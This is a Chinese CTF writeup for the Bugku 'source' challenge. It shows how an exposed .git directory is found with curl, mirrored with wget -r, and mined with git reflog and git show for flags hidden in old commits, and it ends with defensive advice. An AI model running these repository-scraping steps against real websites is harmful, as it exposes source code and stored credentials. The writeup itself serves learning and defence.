---
layout: post
title: "【Bugku CTF】source Writeup"
date: 2026-09-30 23:45:00 +0800
categories: ctf
---

- **平台**：[Bugku CTF](https://ctf.bugku.com/)
- **分类**：WEB
- **分值**：入门
- **考察点**：git 泄露——`.git` 目录裸奔 + 提交历史考古（reflog / show）

> 个人学习记录，flag 已打码，请自行做题获取。

## 题目描述

打开解题链接只有一个朴素的 Hello World 页面，HTML 注释里"贴心"地给了一个 flag——是坏的。真线索在题目名：**source（源码）**——网站把整个 git 仓库留在服务器上了。

## 解题过程

### 0x01 探路：`.git` 目录裸奔

```bash
curl http://目标/.git/
```

返回 **`Index of /.git`** 目录列表——`HEAD`、`config`、`objects/`、`refs/`、`logs/` 全部可下载。教科书级 **git 泄露**实锤：开发者部署时把项目整个目录（含 `.git`）扔上了 web 根目录。

> 顺带：页面注释里那个 `flag{Zmxh...==}` 是**第一层诱饵**——中间的 Base64 是坏的，编不出正经内容。从现在起，这题的每个 flag 都要验货。

### 0x02 搬运：整个 git 数据库拖回本地

```bash
wget -r http://目标/.git/
```

`-r` 递归下载，286 个文件到手——相当于把服务器的 git 仓库原样搬回本地。目录列表页产生的 `index.html` 杂质文件顺手删掉（它们会伪装成 git 引用，把 `git log` 搞报错）。

### 0x03 考古：reflog 让历史现形

```bash
git reflog
```

8 条操作记录、5 个提交现形——出题人 commit 了 4 次都写 "flag is here?"：

```text
13ce8d0 commit: flag is here?     ← 最新
40c6d51 commit: flag is here?
fdce35e commit: flag is here?
d256328 commit: flag is here?
e0b8e8e commit (initial): this is index.html
```

### 0x04 开棺：逐版本翻 flag.txt

```bash
git show <版本号>:flag.txt
```

诱饵矩阵全貌：

| 提交 | flag.txt 内容 | 验货 |
|---|---|---|
| `d256328` | `flag{not_here}` | ❌ |
| `fdce35e` | `flag{nonono}` | ❌ |
| **`40c6d51`** | **flag{***}** | ✅ 真货 |
| `13ce8d0` | `flag{hahahahahhahahahahnotflag}` | ❌ 连名字都在嘲讽 |
| 网页注释 | 坏 Base64 | ❌ 第 0 层陷阱 |

**五个"flag"只有一个真**——真货埋在历史中间层，这就是"source"的含义：**真源码史在 `.git` 里，不在你眼前的页面上**。

## 原理分析

### .git 里到底存了什么

`.git` 不是"配置文件夹"，是**完整的版本数据库**：

```text
.git/
├── objects/   ← 所有历史版本的内容（zlib 压缩的对象）★ flag 尸体在这
├── logs/      ← reflog：HEAD 的每次移动记录
├── refs/      ← 分支/标签指针
├── index      ← 暂存区快照
└── HEAD       ← 当前位置
```

关键认知：**`git commit` 过的东西几乎删不干净**——即使后来的提交删掉了 flag，历史对象依然躺在 `objects/` 里。误删了文件能用 reflog 找回（救过无数程序员命），部署泄露了它就成了攻击者的金矿。**同一个特性，两种命运**。

### git 考古三件套

| 命令 | 作用 | 本题用途 |
|---|---|---|
| `git log` | 沿分支正向看提交 | 被 reset 洗掉的提交看不到 |
| `git reflog` | **HEAD 的完整移动史**（含被丢弃的提交） | 挖出全部 5 个提交 |
| `git show <版本>:<文件>` | 直接查看任意版本的文件内容 | 逐层开棺验 flag |

`reflog` 比 `log` 强在哪：出题人用 `git reset` 把最新提交"洗"回旧版本，`log` 只能看到洗剩下的，**`reflog` 记录了 HEAD 走过的每一步**——被 reset 掉的提交一个都跑不了。

### 真实世界的 git 泄露

- **怎么发生**：`git clone` 到服务器 → 直接把项目目录配成网站根目录 → `.git` 随源码一起上线
- **怎么利用**：除了本题的历史考古，还有 GitHack、dvcs-ripper 等工具能从残缺的 `.git` 恢复完整源码——**配置文件、数据库密码、内部 API 全部沦陷**
- **怎么防御**：部署时删除 `.git`（CI/CD 只发布构建产物）/ web 服务器显式屏蔽 `/.git` 路径 / 敏感信息永不入库

## 复盘

- 解题路径：curl 探 `.git` → wget -r 搬库 → reflog 考古 → show 逐层开棺，四步攻击链一气呵成
- **本题主打"指挥沙箱作战"**：wget/git 这套是 Linux 主场，沙箱代跑全流程、逐步讲解——下次遇到同类题，这就是你该装 Kali 的理由
- **诱饵矩阵**是本题灵魂：5 个假 flag 散布在网页注释和 4 个历史版本里，**"找到 flag"和"找到真 flag"是两回事**——验货意识（Base64 能否正常解码、提交历史全貌）从此入库
- **git 三件套新认知**：天天 push 的 git 第一次变成攻击武器；`reflog`（HEAD 移动史）比 `log`（分支视图）看得深——自己的博客仓库今晚就可以 `git reflog` 玩一圈
- 知识链回顾：linux/Linux2（认文件）→ telnet（抓流量）→ 眼见非实（拆容器）→ 变量1（审代码）→ 本地管理员（改请求）→ easy_nbt（游戏取证）→ 猪圈（图形密码）→ **source（泄露考古）**——Web 三连（变量1 → 本地管理员 → source），从代码审计到请求伪造再到信息泄露，Web 入门铁三角集齐
- 下一题预告：泄露家族还有 svn 泄露、`.DS_Store`、备份文件（`index.php.bak`）、编辑器 swap 文件——套路同源：**找敏感路径 → 拖库 → 考古**

## 参考

- [Pro Git 中文版：Git 内部原理](https://git-scm.com/book/zh/v2/Git-内部原理)
- [Pro Git 中文版：数据恢复与 reflog](https://git-scm.com/book/zh/v2/Git-工具-重置揭密#_git_reflog)
- [GitHack：.git 泄露利用工具](https://github.com/lijiejie/GitHack)
